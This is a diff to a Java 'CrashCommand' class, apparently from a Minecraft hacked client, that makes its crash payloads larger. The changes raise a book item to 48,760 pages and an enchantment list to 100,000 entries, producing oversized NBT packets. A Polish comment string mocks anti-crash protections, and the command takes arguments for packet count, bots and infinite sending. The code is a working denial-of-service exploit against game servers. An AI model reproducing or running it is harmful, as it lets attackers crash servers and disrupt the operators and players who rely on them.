@@ -38,9 +38,9 @@ public class CrashCommand extends Command {
         isBeacon = new ItemStack(137, 64, 0, nbtB);
         isBeacon.getNBT().put(listTagB);
 
-        final CompoundTag nbt2 = new CompoundTag(""); //usunieto 'ench'
+        final CompoundTag nbt2 = new CompoundTag("book");
         final List<Tag> tags2 = new ArrayList<>();
-        for (int i = 0; i < 10000; i++)
+        for (int i = 0; i < 48760; i++)
             tags2.add(new StringTag("-________- jebac antycrasherki"));
         final ListTag listTag2 = new ListTag("pages", tags2);
         isBook = new ItemStack(386, 64, 0, nbt2);
@@ -48,7 +48,7 @@ public class CrashCommand extends Command {
 
         final CompoundTag nbt = new CompoundTag("ench");
         final List<Tag> tags = new ArrayList<>();
-        for (int i = 0; i < 20000; i++)
+        for (int i = 0; i < 100000; i++)
             tags.add(new ByteTag("END"));
         final ListTag listTag = new ListTag("END", tags);
         isByte = new ItemStack(386, 64, 0, nbt);
@@ -80,9 +80,9 @@ public class CrashCommand extends Command {
                 p.sendMessage("$p &cNie jestes polaczony z serwerem!");
                 return;
             }
-            final Integer packets = Integer.parseInt(args[1]);
-            final Boolean bots = Boolean.parseBoolean(args[2]);
-            final Boolean infinite = Boolean.parseBoolean(args[3]);
+            final int packets = Integer.parseInt(args[1]);
+            final boolean bots = Boolean.parseBoolean(args[2]);
+            final boolean infinite = Boolean.parseBoolean(args[3]);
             final int seconds = Integer.parseInt(args[4]);
             final String item = args[6];
             final CrashType crashType;
